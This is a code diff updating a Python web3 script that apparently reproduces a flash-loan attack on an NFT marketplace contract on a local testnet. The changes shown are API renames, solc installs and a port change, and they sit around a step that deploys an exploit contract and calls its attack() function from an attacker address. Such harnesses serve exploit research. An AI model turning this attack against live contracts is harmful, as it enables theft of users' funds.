@@ -7,6 +7,8 @@ import  os
 from web3 import Web3
 import solcx
 
+solcx.install_solc('0.6.6')  # Install BEFORE using
+solcx.install_solc('0.8.9')  # Install BEFORE using
 
 def get_market_NFTs():
     w3 = run_rpc()
@@ -25,7 +27,7 @@ def get_market_NFTs():
     profitable_nfts = list()
     for idx in range(1000, 4000):
         nft = idolMarketplaceContract.caller().godListings(idx)
-        if nft[1] > w3.toWei(1, "ether"):
+        if nft[1] > w3.to_wei(1, "ether"):
             profitable_nfts.append(idx)
             print(idx)
 
@@ -35,8 +37,8 @@ def get_market_NFTs():
 
 
 def run_rpc():
-    w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545", request_kwargs={'timeout': 120}))
-    assert w3.isConnected() == True, "[ERROR] Testnet is not activated."
+    w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:18545", request_kwargs={'timeout': 120}))
+    assert w3.is_connected() == True, "[ERROR] Testnet is not activated."
     return w3
 
 
@@ -126,7 +128,7 @@ def flashload():
     expContract = w3.eth.contract(address=_receipt['contractAddress'] , abi=_r['abi'])
 
 
-    _tx_hash = expContract.functions.attack(w3.toWei(1000, "ether"), nfts).transact({'from':attacker_addr, 'gas':6721075})
+    _tx_hash = expContract.functions.attack(w3.to_wei(1000, "ether"), nfts).transact({'from':attacker_addr, 'gas':6721075})
     _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
     assert _receipt["status"] == 1
 
